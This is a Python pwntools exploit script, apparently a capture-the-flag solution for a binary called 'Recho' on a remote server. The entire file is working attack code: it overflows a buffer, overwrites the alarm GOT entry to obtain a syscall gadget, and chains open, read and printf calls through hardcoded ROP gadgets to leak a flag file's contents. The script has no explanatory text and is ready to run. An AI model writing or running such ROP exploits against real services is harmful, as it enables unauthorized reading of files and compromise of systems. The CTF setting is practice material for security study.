from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./Recho"
# libc_binary = "./"

# p = process(argv=[binary])
p = remote("220.249.52.133",40691)

elf = ELF(binary)
# libc = ELF(libc_binary)
context.arch = "amd64"

alarm_plt = elf.sym["alarm"]
alarm_got = elf.got["alarm"]
flag = 0x601058

pop_rdi_ret = 0x4008a3
add_rdi_ret = 0x40070d
pop_rax_ret = 0x4006fc
pop_rsi_r15_ret = 0x4008a1
pop_rdx_ret = 0x4006fe

payload = flat([
    "a"*0x38,
    # alarm -> syscall
    pop_rax_ret,5,
    pop_rdi_ret,alarm_got,
    add_rdi_ret,
    # syscall open
    pop_rax_ret,2,
    pop_rdi_ret,flag,
    pop_rdx_ret,0,
    pop_rsi_r15_ret,0,0,
    elf.plt["alarm"],
    # syscall read
    pop_rdi_ret,3,
    pop_rsi_r15_ret,0x601090+0x500,0,
    pop_rdx_ret,0x30,
    elf.plt['read'],
    # call printf
    pop_rdi_ret,0x601090+0x500,
    elf.plt["printf"],
])
'''
alarm -> syscall
pop_rax_ret,5
pop_rdi,alarm_got
add_rdi_ret

syscall -> open
pop_rax 0x5
rdi flag
rsi (r15) 0 0
'''
p.sendlineafter("Welcome to Recho server!\n","512")
p.send(payload.ljust(0x200,"\x00"))
p.recv()
p.shutdown("send")

p.interactive()
p.close()
